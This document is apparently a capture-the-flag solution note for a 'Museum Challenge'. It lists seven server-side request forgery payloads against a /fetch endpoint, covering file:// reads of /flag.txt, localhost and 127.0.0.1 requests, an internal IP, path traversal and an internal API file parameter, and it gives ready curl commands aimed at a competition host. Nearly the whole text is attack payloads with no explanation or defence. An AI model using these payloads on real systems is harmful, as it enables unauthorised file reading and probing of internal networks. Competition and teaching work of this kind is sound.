SSRF Backdoor Exploitation - Museum Challenge

The backdoor is the /fetch endpoint that accepts user-controlled URLs and makes server-side requests.

Exploitation payloads to try:

1. Direct file access (if file:// protocol is allowed):
   POST /fetch
   Content-Type: text/plain
   
   file:///flag.txt

2. Try localhost access:
   POST /fetch
   Content-Type: text/plain
   
   http://localhost/flag.txt

3. Try 127.0.0.1:
   POST /fetch
   Content-Type: text/plain
   
   http://127.0.0.1/flag.txt

4. Try the internal IP with different paths:
   POST /fetch
   Content-Type: text/plain
   
   http://172.16.0.30/flag.txt

5. Try file protocol with different syntax:
   POST /fetch
   Content-Type: text/plain
   
   file://localhost/flag.txt

6. Try path traversal on the internal API:
   POST /fetch
   Content-Type: text/plain
   
   http://172.16.0.30/../../../flag.txt

7. Try the internal API with file parameter:
   POST /fetch
   Content-Type: text/plain
   
   http://172.16.0.30/api/fetch?file=/flag.txt

The most likely working payload is one of the localhost/127.0.0.1 variants or file:// protocol.

Use curl or Burp Suite to test:

curl -X POST https://mnbvcxzasdfghj-csc26.cybersecuritychallenge.al/fetch \
  -H "Content-Type: text/plain" \
  -d "file:///flag.txt"

OR

curl -X POST https://mnbvcxzasdfghj-csc26.cybersecuritychallenge.al/fetch \
  -H "Content-Type: text/plain" \
  -d "http://127.0.0.1/flag.txt"
